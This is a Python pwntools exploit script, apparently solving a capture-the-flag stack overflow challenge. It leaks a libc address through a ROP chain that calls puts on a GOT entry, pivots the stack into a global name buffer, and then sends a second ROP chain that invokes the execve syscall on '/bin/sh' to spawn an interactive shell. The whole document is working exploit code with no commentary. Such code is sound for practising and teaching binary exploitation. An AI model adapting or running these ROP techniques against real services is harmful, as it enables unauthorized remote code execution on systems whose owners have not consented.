from pwn import *
context.update(os = 'linux',arch = 'amd64')
context.log_level = 'debug'
binary = '../src/pwn'
elf = ELF(binary, checksec=False)
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    libc = ELF('../src/libc/libc.so.6', checksec=False)
    host = '0.0.0.0'
    port = '1145'
    p = remote(host,port)

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
ru = lambda delim: p.recvuntil(delim)
io = lambda: p.interactive()

pop_rbp_ret = 0x000000000040121d
pop_rdi_ret = 0x00000000004012a3
ret = 0x000000000040101a
name_addr = 0x4046C0
vuln_read = 0x401335
magic = 0x4013E6
bss = elf.bss(0xa00)

def pwn():
    ru(b"name\n")
    pay = fit(pop_rdi_ret, elf.got["puts"], elf.plt["puts"], pop_rbp_ret, name_addr+0x28+0x60, 0x40134A)
    s(pay)
    ru(b"words\n")
    pay = fit(b"a"*0x60, name_addr-0x8)
    # gdb.attach(p, "b *0x40141D")
    s(pay)

    ru(b"Input:\n")
    p.recvline()
    libc.address = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - libc.sym["puts"]
    system = libc.sym["system"]
    binsh = next(libc.search(b"/bin/sh"))
    info(f"libc: {libc.address:#x}")

    sleep(0.2)
    pop_rdx_rbx_ret = libc.address + 0x00000000000904a9
    pop_rsi_ret = libc.address + 0x000000000002be51
    pop_rax_ret = libc.address + 0x0000000000045eb0
    syscall_ret = libc.address + 0x0000000000091316

    pay = fit(
        pop_rdi_ret, 0x4046e8+0x50,
        pop_rsi_ret, 0,
        pop_rdx_rbx_ret, 0, 0,
        pop_rax_ret, 59,
        syscall_ret,
        b"/bin/sh\x00"
    )

    s(pay)


    io()
pwn()